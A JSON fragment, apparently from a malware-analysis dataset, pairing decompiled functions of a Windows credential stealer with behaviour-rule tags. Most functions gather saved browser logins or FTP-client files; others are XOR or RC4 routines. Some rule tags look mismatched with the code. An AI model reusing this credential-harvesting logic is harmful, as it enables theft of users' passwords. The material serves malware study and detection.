        "decompiled_code": "\nvoid fcn.00411543(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.00410eb9(param_1);\n    puVar2 = param_1 + 0x80;\n    puVar1 = 0x415714;\n    do {\n        *puVar2 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (puVar1 < 0x415794);\n    puVar1 = 0x415794;\n    do {\n        *puVar2 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (puVar1 < 0x415814);\n    return;\n}\n",
        "token_count": 187
    },
    "00411584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00411584(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.00410ed7(param_1);\n    puVar2 = param_1 + 0x80;\n    puVar1 = 0x415714;\n    do {\n        *puVar1 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 < 0x415794);\n    puVar1 = 0x415794;\n    do {\n        *puVar1 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 < 0x415814);\n    return;\n}\n",
        "token_count": 187
    },
    "004115c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004115c5(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00410f2a(arg_8h, &var_8h);\n    fcn.00410f2a(arg_8h + 8, &var_10h);\n    fcn.00410f2a(arg_8h + 0x10, &var_18h);\n    fcn.00410fda(&var_8h, 0x415694);\n    fcn.00410fda(&var_10h, 0x415694);\n    fcn.00410fda(&var_18h, 0x415694);\n    uVar2 = var_4h;\n    uVar1 = var_ch;\n    var_4h = var_10h;\n    var_10h = uVar2;\n    var_ch = var_18h;\n    var_18h = uVar1;\n    fcn.00410fda(&var_8h, 0x415714);\n    fcn.00410fda(&var_10h, 0x415714);\n    fcn.00410fda(&var_18h, 0x415714);\n    uVar2 = var_4h;\n    uVar1 = var_ch;\n    var_4h = var_10h;\n    var_10h = uVar2;\n    var_ch = var_18h;\n    var_18h = uVar1;\n    fcn.00410fda(&var_8h, 0x415794);\n    fcn.00410fda(&var_10h, 0x415794);\n    fcn.00410fda(&var_18h, 0x415794);\n    fcn.00410f8d(&var_8h, arg_ch);\n    fcn.00410f8d(&var_10h, arg_ch + 8);\n    fcn.00410f8d(&var_18h, arg_ch + 0x10);\n    return;\n}\n",
        "token_count": 502
    },
    "00401e0f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401e0f(uint lpFileName, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    \n    fcn.004017bc(arg_ch, 0x10);\n    iVar1 = sub.kernel32.dll_CreateFileA(lpFileName, 0x80000000, 3, 0, 3, 0, 0);\n    *arg_ch = iVar1;\n    if (iVar1 != -1) {\n        iVar1 = sub.kernel32.dll_GetFileSize(iVar1, 0);\n        arg_ch[3] = iVar1;\n        iVar1 = sub.kernel32.dll_CreateFileMappingA(*arg_ch, 0, 2, 0, 0, 0);\n        if (iVar1 == 0) {\n            sub.kernel32.dll_CloseHandle(*arg_ch);\n            *arg_ch = -1;\n        }\n        else {\n            arg_ch[1] = iVar1;\n            iVar1 = sub.kernel32.dll_MapViewOfFile(iVar1, 4, 0, 0, 0);\n            arg_ch[2] = iVar1;\n            if (iVar1 == 0) {\n                sub.kernel32.dll_CloseHandle(arg_ch[1]);\n                sub.kernel32.dll_CloseHandle(*arg_ch);\n                *arg_ch = -1;\n            }\n        }\n    }\n    return arg_ch[2] != 0;\n}\n",
        "token_count": 299
    },
    "00411768": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411768(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = 0;\n    do {\n        *(&var_8h + iVar1) = *(iVar1 + arg_8h);\n        *(iVar1 + arg_ch) = *(iVar1 + arg_8h);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 8);\n    fcn.004112b5(arg_8h, arg_ch);\n    iVar1 = 0;\n    do {\n        *(iVar1 + arg_ch) = *(iVar1 + arg_ch) ^ *(iVar1 + arg_10h);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 8);\n    iVar1 = 0;\n    do {\n        *(iVar1 + arg_10h) = *(&var_8h + iVar1);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 8);\n    return;\n}\n",
        "token_count": 244
    },
    "00411274": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00411274(int32_t param_1, uint16_t param_2)\n\n{\n    fcn.00410d00(param_1 + 8, param_2 == 0);\n    fcn.00410eb9(0x415714);\n    fcn.00410d00(param_1, param_2);\n    fcn.00410eb9(0x415794);\n    return;\n}\n",
        "token_count": 93
    },
    "0040221d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040221d(void)\n\n{\n    uint *puVar1;\n    uint *hMem;\n    \n    hMem = *0x4120b7;\n    while (hMem != NULL) {\n        puVar1 = *hMem;\n        fcn.0040178e(hMem);\n        hMem = puVar1;\n    }\n    *0x4120b7 = NULL;\n    return;\n}\n",
        "token_count": 92
    },
    "0040b88e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040b88e(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    \n    fcn.00402720(arg_8h);\n    puVar2 = sub.shlwapi.dll_StrStrIA(arg_8h, 0x413c32);\n    if (puVar2 == NULL) {\n        return puVar2;\n    }\n    *puVar2 = 0;\n    fcn.00402720(arg_8h);\n    pcVar4 = 0x413c34;\n    do {\n        puVar2 = sub.kernel32.dll_lstrcmpiA();\n        if (puVar2 == NULL) {\n            return puVar2;\n        }\n        iVar3 = -1;\n        pcVar5 = pcVar4;\n        do {\n            pcVar4 = pcVar5;\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            pcVar4 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar4;\n        } while (cVar1 != '\\0');\n        if (*pcVar4 == '\\0') {\n            puVar2 = sub.kernel32.dll_lstrlenA(arg_8h);\n            if (puVar2 == NULL) {\n                return puVar2;\n            }\n            iVar3 = sub.kernel32.dll_lstrcmpiA(arg_8h, \"origin_url\");\n            if (iVar3 == 0) {\n                *0x41709c = arg_ch;\n            }\n            iVar3 = sub.kernel32.dll_lstrcmpiA(arg_8h, \"password_value\");\n            if (iVar3 == 0) {\n                *0x4170a0 = arg_ch;\n            }\n            iVar3 = sub.kernel32.dll_lstrcmpiA(arg_8h, \"username_value\");\n            if (iVar3 == 0) {\n                *0x4170a4 = arg_ch;\n            }\n            return 0x1;\n        }\n    } while( true );\n}\n",
        "token_count": 469
    },
    "0040bd5e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bd5e(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    \n    fcn.00402720(arg_8h);\n    puVar2 = sub.shlwapi.dll_StrStrIA(arg_8h, 0x413c32);\n    if (puVar2 == NULL) {\n        return puVar2;\n    }\n    *puVar2 = 0;\n    fcn.00402720(arg_8h);\n    pcVar4 = 0x413c34;\n    do {\n        puVar2 = sub.kernel32.dll_lstrcmpiA();\n        if (puVar2 == NULL) {\n            return puVar2;\n        }\n        iVar3 = -1;\n        pcVar5 = pcVar4;\n        do {\n            pcVar4 = pcVar5;\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            pcVar4 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar4;\n        } while (cVar1 != '\\0');\n        if (*pcVar4 == '\\0') {\n            puVar2 = sub.kernel32.dll_lstrlenA(arg_8h);\n            if (puVar2 == NULL) {\n                return puVar2;\n            }\n            iVar3 = sub.kernel32.dll_lstrcmpiA(arg_8h, \"hostname\");\n            if (iVar3 == 0) {\n                *0x4170a8 = arg_ch;\n            }\n            iVar3 = sub.kernel32.dll_lstrcmpiA(arg_8h, \"encryptedPassword\");\n            if (iVar3 == 0) {\n                *0x4170ac = arg_ch;\n            }\n            iVar3 = sub.kernel32.dll_lstrcmpiA(arg_8h, \"encryptedUsername\");\n            if (iVar3 == 0) {\n                *0x4170b0 = arg_ch;\n            }\n            return 0x1;\n        }\n    } while( true );\n}\n",
        "token_count": 468
    },
    "004059a5": {
        "rules": [
            "gather bulletproof-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059a5(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040404c(arg_8h, arg_ch, \".dat\", 0xbeef0000);\n    fcn.0040404c(arg_8h, arg_ch, \".bps\", 0xbeef0001);\n    return;\n}\n",
        "token_count": 78
    },
    "00405bcb": {
        "rules": [
            "gather turbo-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bcb(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\TurboFTP\", \"installpath\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, arg_ch, arg_10h);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(0x80000002, \"Software\\\\TurboFTP\", \"installpath\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, arg_ch, arg_10h);\n        fcn.0040178e(uVar2);\n    }\n    fcn.00404097(arg_8h, \"\\\\TurboFTP\", arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 252
    },
    "0040743a": {
        "rules": [
            "gather directory-opus information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040743a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpString2;\n    uint uVar1;\n    uint arg_ch_00;\n    \n    lpString2 = fcn.00401cc2(arg_ch);\n    if (lpString2 != 0) {\n        uVar1 = fcn.00401c5d(lpString2, \"\\\\GPSoftware\\\\Directory Opus\");\n        arg_ch_00 = arg_8h;\n        fcn.0040404c(arg_8h, uVar1, \".oxc\", 0xbeef0000);\n        uVar1 = arg_8h;\n        fcn.0040404c(arg_8h, arg_ch_00, \".oll\", 0xbeef0001);\n        fcn.0040404c(arg_8h, uVar1, \"ftplast.osd\", 0xbeef0002);\n        fcn.0040178e(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "0040777a": {
        "rules": [
            "gather leapftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040777a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpString2;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    \n    lpString2 = fcn.00401cc2(arg_ch);\n    if (lpString2 != 0) {\n        arg_ch_00 = fcn.00401c5d(lpString2, \"\\\\LeapWare\\\\LeapFTP\");\n        arg_ch_01 = arg_8h;\n        fcn.0040404c(arg_8h, arg_ch_00, \"sites.dat\", 0xbeef0000);\n        fcn.0040404c(arg_8h, arg_ch_01, 0x413440, 0xbeef0001);\n        fcn.0040178e(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00408d28": {
        "rules": [
            "gather ftp-voyager information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408d28(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpString2;\n    uint uVar1;\n    uint uVar2;\n    \n    lpString2 = fcn.00401cc2(arg_ch);\n    if (lpString2 != 0) {\n        uVar1 = fcn.00401c5d(lpString2, \"\\\\RhinoSoft.com\");\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, uVar1, \"FTPVoyager.ftp\", 0xbeef0000);\n        uVar1 = arg_8h;\n        fcn.0040404c(arg_8h, uVar2, \"FTPVoyager.ftp.backup\", 0xbeef0000);\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, uVar1, \"FTPVoyager.ftp.old.backup\", 0xbeef0000);\n        fcn.0040404c(arg_8h, uVar2, \"FTPVoyager.qc\", 0xbeef0001);\n        fcn.0040178e(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "0040c6b2": {
        "rules": [
            "gather global-downloader information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6b2(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpString2;\n    uint arg_ch_00;\n    \n    lpString2 = fcn.00401cc2(arg_ch);\n    if (lpString2 != 0) {\n        arg_ch_00 = fcn.00401c5d(lpString2, \"\\\\Global Downloader\");\n        fcn.0040404c(arg_8h, arg_ch_00, \"SM.arch\", 0xbeef0000);\n        fcn.0040178e(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0040d8e5": {
        "rules": [
            "gather cyberduck information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d8e5(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpString2;\n    uint arg_ch_00;\n    \n    lpString2 = fcn.00401cc2(arg_ch);\n    if (lpString2 != 0) {\n        arg_ch_00 = fcn.00401c5d(lpString2, \"\\\\Cyberduck\");\n        fcn.00403ea1(arg_8h, arg_ch_00, \"user.config\", 0xbeef0000, fcn.0040d7d4);\n        fcn.0040178e(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 147
    }
}